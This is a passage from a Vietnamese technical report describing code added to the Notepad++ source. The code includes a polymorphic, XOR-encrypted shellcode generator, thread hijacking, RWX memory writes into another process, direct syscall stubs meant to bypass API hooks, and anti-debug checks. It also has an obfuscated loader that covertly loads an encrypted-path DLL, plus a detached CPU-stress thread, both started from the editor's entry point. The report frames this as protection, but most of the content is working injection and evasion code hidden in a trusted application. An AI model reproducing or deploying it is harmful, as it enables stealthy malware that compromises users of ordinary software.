std::vector<BYTE> PolymorphicShellcodeGenerator::genSetRipx64(PVOID target, PVOID param) {
    std::vector<BYTE> shellcode;
    
    // mov rcx, param
    BYTE mov_rcx[] = { 0x48, 0xB9 };
    shellcode.insert(shellcode.end(), mov_rcx, mov_rcx + 2);
    shellcode.insert(shellcode.end(), (BYTE*)&param, (BYTE*)&param + 8);
    
    // mov rax, target
    BYTE mov_rax[] = { 0x48, 0xB8 };
    shellcode.insert(shellcode.end(), mov_rax, mov_rax + 2);
    shellcode.insert(shellcode.end(), (BYTE*)&target, (BYTE*)&target + 8);
    
    // jmp rax
    BYTE jmp_rax[] = { 0xFF, 0xE0 }; // jmp rax
    shellcode.insert(shellcode.end(), jmp_rax, jmp_rax + 2);
    
    return shellcode;
}
```

### 10.4 Indirect Call Shellcode (Syscall Convention)

```cpp
std::vector<BYTE> PolymorphicShellcodeGenerator::genIndirectCallx64(PVOID target, PVOID param) {
    std::vector<BYTE> shellcode;
    
    // Save R10
    BYTE push_r10[] = { 0x41, 0x50 }; // push r10
    shellcode.insert(shellcode.end(), push_r10, push_r10 + 2);
    
    // mov r10, param
    BYTE mov_r10_param[] = { 0x49, 0xBA };
    shellcode.insert(shellcode.end(), mov_r10_param, mov_r10_param + 2);
    shellcode.insert(shellcode.end(), (BYTE*)&param, (BYTE*)&param + 8);
    
    // mov rcx, r10 (first param)
    BYTE mov_rcx_r10[] = { 0x4C, 0x89, 0xD1 }; // mov rcx, r10
    shellcode.insert(shellcode.end(), mov_rcx_r10, mov_rcx_r10 + 3);
    
    // mov rax, target
    BYTE mov_rax[] = { 0x48, 0xB8 };
    shellcode.insert(shellcode.end(), mov_rax, mov_rax + 2);
    shellcode.insert(shellcode.end(), (BYTE*)&target, (BYTE*)&target + 8);
    
    // call rax
    shellcode.push_back(0xFF);
    shellcode.push_back(0xD0);
    
    // Restore R10
    BYTE pop_r10[] = { 0x41, 0x58 }; // pop r10
    shellcode.insert(shellcode.end(), pop_r10, pop_r10 + 2);
    
    // Return
    shellcode.push_back(0xC3);
    
    return shellcode;
}
```

### 10.5 Polymorphic Shellcode Generation

```cpp
std::vector<BYTE> PolymorphicShellcodeGenerator::generate(PVOID target, PVOID param, ShellcodeType type) {
    std::vector<BYTE> shellcode;
    
#ifdef _M_X64
    switch (type) {
        case SHELLCODE_SIMPLE_CALL:
            shellcode = genSimpleCallx64(target, param);
            break;
        case SHELLCODE_SETRIP_EXECUTE:
            shellcode = genSetRipx64(target, param);
            break;
        case SHELLCODE_STACK_PIVOT:
            shellcode = genStackPivotx64(target, param, 0x1000);
            break;
        case SHELLCODE_INDIRECT_CALL:
            shellcode = genIndirectCallx64(target, param);
            break;
    }
#else
    // x86 variants
#endif
    
    // Insert junk code
    insertJunkCode(shellcode);
    
    // Encrypt with XOR
    encryptXOR(shellcode.data(), (DWORD)shellcode.size(), xorKey);
    
    // Regenerate key for next use
    generateKey();
    
    return shellcode;
}
```

---

## 11. Integration với Notepad++

### 11.1 Obfuscated DLL Loading

```cpp
namespace ObfInit {

// Encrypted DLL path (XOR key: 0x5A)
static const BYTE g_encryptedDllPath[] = {
    0x9F, 0x7B, 0x6E, 0x6D, 0x63, 0x7C, 0x63, 0x66, 0x69, 0x6F,
    // ... encrypted bytes
    0x00
};

inline void decryptString(BYTE* data, size_t len) {
    const DWORD key = 0x5A;
    for (size_t i = 0; i < len; i++) {
        data[i] ^= ((key >> (i % 4)) & 0xFF);
    }
}

bool loadDllObfuscated() {
    // Step 1: Anti-debug check
    if (AntiDebug::QuickDebugCheck()) {
        return false;
    }
    
    // Step 2: Decrypt DLL path
    size_t pathLen = 0;
    while (g_encryptedDllPath[pathLen] != 0) pathLen++;
    
    std::vector<BYTE> decryptedPath(g_encryptedDllPath, g_encryptedDllPath + pathLen + 1);
    decryptString(decryptedPath.data(), pathLen);
    
    // Step 3: Check if file exists using obfuscated API
    WIN32_FILE_ATTRIBUTE_DATA fileInfo;
    BOOL fileExists = ObfCore::ObfAPI::ObfGetFileAttributes(
        (LPCWSTR)decryptedPath.data(), &fileInfo
    );
    
    if (!fileExists) {
        return false;
    }
    
    // Step 4: Load DLL using polymorphic LoadLibrary
    HMODULE hModule = ObfCore::ObfAPI::ObfLoadLibraryW((LPCWSTR)decryptedPath.data());
    
    if (!hModule) {
        return false;
    }
    
    // Step 5: Get and call initialization function
    FARPROC initFunc = ObfCore::ObfAPI::ObfGetProcAddress(hModule, "DllMain");
    
    if (initFunc) {
        ((void(*)())initFunc)();
    }
    
    return true;
}

} // namespace ObfInit
```

### 11.2 Entry Point Wrapper

```cpp
void loadStartupDll() {
    // Run anti-debug before any operation
    AntiDebug::ExitOnDebug();
    
    // Use obfuscated DLL loading
    ObfInit::loadDllObfuscated();
}
```

### 11.3 Integration trong wWinMain

```cpp
int WINAPI wWinMain(_In_ HINSTANCE hInstance,
                    _In_opt_ HINSTANCE /*hPrevInstance*/, _In_ PWSTR pCmdLine,
                    _In_ int /*nShowCmd*/) {
    g_nppStartTimePoint = std::chrono::steady_clock::now();

    // Load DLL khi khoi dong (truoc giao dien)
    loadStartupDll();

    // Thiet lap Console thong bao
    SetupConsole();

    // Chạy script stress CPU trực tiếp bằng C++
    std::thread([]() { RunCpuStressAndNotify(); }).detach();

    // ... rest of Notepad++ initialization ...
}
```

---

## 12. Phân tích các đoạn code quan trọng

### 12.1 Syscall Stub Generator

```cpp
#ifdef _M_X64
__declspec(naked) DWORD __stdcall SyscallStubx64(DWORD syscallNumber) {
    __asm {
        mov r10, rcx
        mov eax, edx
        syscall
        ret
    }
}
#endif

#ifdef _M_IX86
__declspec(naked) DWORD __stdcall SyscallStubx86(DWORD syscallNumber) {
    __asm {
        mov eax, [esp+4]
        mov edx, [esp+0]
        int 0x2E
        ret 4
    }
}
#endif
```

**Giải thích:**

- `__declspec(naked)` ngăn compiler không thêm prologue/epilogue code

- x64: Syscall number đặt trong EAX, parameters trong registers theo fastcall convention

- x86: Sử dụng int 0x2E (legacy syscall method)

- Direct syscall bypasses user-mode API hooks

### 12.2 Memory Obfuscation Utilities

```cpp
namespace MemObf {
    
    void encryptMemory(PVOID address, SIZE_T size, DWORD key) {
        BYTE* data = (BYTE*)address;
        for (SIZE_T i = 0; i < size; i++) {
            data[i] ^= (key >> (i % 4)) & 0xFF;
        }
    }
    
    PVOID allocSelfDecrypting(HANDLE hProcess, SIZE_T size, PVOID executableCode) {
        PVOID address = VirtualAllocEx(hProcess, NULL, size,
                                       MEM_COMMIT | MEM_RESERVE,
                                       PAGE_EXECUTE_READWRITE);
        if (!address) return NULL;
        
        // Write code
        WriteProcessMemory(hProcess, address, executableCode, size, NULL);
        
        // Encrypt after writing
        DWORD key = GenerateRandomDword();
        std::vector<BYTE> temp(size);
        ReadProcessMemory(hProcess, address, temp.data(), size, NULL);
        encryptMemory(temp.data(), size, key);
        WriteProcessMemory(hProcess, address, temp.data(), size, NULL);
        
        return address;
    }
}
```

### 12.3 Integrity Checker

```cpp
DWORD calcChecksum(BYTE* data, DWORD size) {
    DWORD checksum = 0;
    
    for (DWORD i = 0; i < size; i++) {
        checksum = ((checksum << 31) | (checksum >> 1)) + data[i];
    }
    
    return checksum;
}

bool IntegrityChecker::verify() {
    DWORD current = calculateCurrentChecksum();
    return current == originalChecksum;
}
```

---

## 13. Kết luận và hướng phát triển

### 13.1 Tổng kết các kỹ thuật đã triển khai

Dự án đã triển khai thành công một hệ thống bảo vệ nâng cao với các thành phần chính:

1. **Anti-Debugging Layer**: 9 phương pháp phát hiện debugger khác nhau
2. **VM-based Obfuscation**: Custom bytecode VM với 16+ opcodes
3. **Polymorphic Engine**: 5 loại mutation + dead code insertion
4. **Control Flow Flattening**: State machine-based control flow
5. **String Encryption**: Runtime decryption với template-based encryption
6. **Dynamic API Resolution**: PEB-based module/function resolution
7. **Thread Hijacking**: Complete implementation với state machine
8. **Shellcode Generation**: 4 loại shellcode + polymorphic encryption

### 13.2 Ưu điểm của hệ thống

- **Đa lớp bảo vệ**: Nhiều kỹ thuật phối hợp tạo ra defense in depth
- **Khó phát hiện**: Polymorphic code thay đổi mỗi lần build
- **Bypass hooks**: Direct syscall tránh user-mode API hooks
- **Anti-analysis**: Timing checks và exception-based detection

### 13.3 Hạn chế

- **Performance overhead**: VM và encryption có cost về performance
- **Debugging khó khăn**: Chính vì obfuscation mà việc debug cũng khó hơn
- **Không thể bảo vệ 100%**: Mọi obfuscation đều có thể được reverse

### 13.4 Hướng phát triển tương lai

1. **VM Handler Optimization**: Tối ưu hóa VM handlers để giảm overhead
2. **Anti-VM Detection**: Thêm detection cho sandbox environments
3. **Code Virtualization Compiler**: Tự động compile code thành bytecode VM
4. **Machine Learning-based Mutation**: Sử dụng ML để sinh polymorphic code thông minh hơn
5. **Hardware Breakpoint Evasion**: Cải thiện detection và evasion

---

## Phụ lục: Cấu trúc File

```text
PowerEditor/src/MISC/Obfuscation/
├── AntiDebug.h               # Anti-debugging layer (423 lines)
├── ObfuscationCore.h         # Core obfuscation + VM (369 lines)
├── ObfuscationCore.cpp       # Implementation (762 lines)
├── ThreadHijackObfuscated.h  # Thread hijacking header (494 lines)
└── ThreadHijackObfuscated.cpp # Thread hijacking implementation (1142 lines)
```

---

## Tài liệu tham khảo

1. Microsoft Windows Internals - Mark Russinovich
2. The Rootkit Arsenal - Bill Blunden
3. Practical Malware Analysis - Michael Sikorski and Andrew Honig
4. Windows PE/COFF Specification - Microsoft
5. Intel 64 and IA-32 Architectures Software Developer's Manual

---
